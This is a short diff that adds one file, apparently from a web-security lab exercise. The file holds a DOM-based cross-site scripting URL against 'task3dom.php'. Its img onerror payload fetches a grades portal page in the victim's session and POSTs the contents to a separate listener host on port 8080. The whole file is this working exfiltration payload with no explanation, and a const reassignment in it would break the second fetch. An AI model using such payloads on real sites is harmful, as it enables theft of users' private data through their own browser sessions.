@@ -1,0 +1,31 @@
+http://192.168.1.203/task3dom.php?user=#<img src="be" onerror="
+(async () => {
+    const url = '/gradesPortal.php';
+
+    try {
+        const response = await fetch(url);
+
+        if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
+        }
+        const data = await response.text();
+
+        console.log('Success:', data);
+
+        const my_url = 'http://192.168.1.201:8080';
+
+        response = await fetch(my_url, {
+            method: 'POST',
+            body: data,
+        });
+
+        if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
+        }
+
+    } catch (error) {
+        console.error('Fetch failed:', error);
+        return null;
+    }
+})();
+">
